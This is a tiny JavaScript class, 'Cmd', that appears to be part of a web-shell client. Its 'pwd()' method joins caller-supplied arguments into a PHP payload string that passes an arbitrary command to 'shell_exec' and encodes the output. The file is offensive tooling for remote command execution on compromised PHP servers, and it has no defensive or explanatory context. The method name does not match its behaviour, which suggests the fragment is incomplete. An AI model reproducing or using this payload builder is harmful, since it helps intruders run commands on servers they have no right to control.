export default class Cmd {
    constructor(arg1, arg2) {
        this.arg1 = arg1
        this.arg2 = arg2
        // console.log(1);
    }


    pwd() {
        return `${arguments[0]}; encode(shell_exec('${arguments[1]}'));`
    }
}

